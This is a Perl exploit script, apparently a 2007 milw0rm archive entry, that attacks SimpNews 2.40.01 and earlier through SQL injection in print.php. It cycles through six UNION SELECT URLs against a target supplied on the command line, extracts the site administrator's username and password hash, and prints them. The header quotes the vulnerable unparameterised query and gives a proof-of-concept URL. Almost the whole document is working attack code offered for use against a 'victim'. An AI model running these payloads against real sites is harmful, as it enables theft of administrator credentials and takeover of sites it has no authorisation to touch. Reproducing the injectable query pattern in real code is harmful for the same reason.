#!/usr/bin/perl -w

#################################################################################
#                                                                               #
#                    SimpNews <= 2.40.01 SQL Injection Exploit                  #
#                                                                               #
# Discovered by: Silentz                                                        #
# Payload: Admin Username & Hash Retrieval                                      #
# Website: http://www.w4ck1ng.com                                               #
#                                                                               #
# Vulnerable Code (print.php):                                                  #
#                                                                               #
#      $sql = "select * from ".$tableprefix."_data where newsnr=$newsnr";       #
#                                                                               #
# PoC: http://victim.com/simpnews/print.php?lang=en&layout=def&newsnr=-999      #
#      UNION SELECT 0,0,0,password,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,    #
#      0,0,0 FROM simpnews_users WHERE usernr=1                                 #
#                                                                               #
# Subject To: magic_quotes_gpc set to off                                       #
# GoogleDork: Get your own!                                                     #
#                                                                               #
# Shoutz: The entire w4ck1ng community			                        #
#                                                                               #
#################################################################################

use LWP::UserAgent;

if (@ARGV < 1){
print "-------------------------------------------------------------------------\r\n";
print "                 SimpNews <= 2.40.01 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "Usage: w4ck1ng_simpnews.pl [PATH]\r\n\r\n";
print "[PATH] = Path where SimpNews is located\r\n\r\n";
print "e.g. w4ck1ng_simpnews.pl http://victim.com/simpnews/\r\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
exit();
}

$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

@paths = (
"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1",
"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1",
"print.php?lang=en&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1",
"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1",
"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1",
"print.php?lang=en&layout=def&newsnr=-999 UNION SELECT 0,0,0,password,username,username,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpnews_users WHERE usernr=1"
);

for($i=0;$i<6;$i++){
  $host = $ARGV[0] . $paths[$i];
  $res = $b->request(HTTP::Request->new(GET=>$host));
  ($user) = $res->content =~ /poster: (.*?)<\/font><\/td><\/tr>/;
  ($hash) = $res->content =~ /([0-9a-fA-F]{32})<\/font>/;
  if($hash){ last; }
}

if($user && $hash){

print "-------------------------------------------------------------------------\r\n";
print "                 SimpNews <= 2.40.01 SQL Injection Exploit\r\n";
print "-------------------------------------------------------------------------\r\n";
print "[+] Admin User : $user\n";
print "[+] Admin Hash : $hash\n";
print "-------------------------------------------------------------------------\r\n";
print "            		 http://www.w4ck1ng.com\r\n";
print "            		        ...Silentz\r\n";
print "-------------------------------------------------------------------------\r\n";
} else {
  print "\nExploit Failed...\n";
}

# milw0rm.com [2007-05-16]
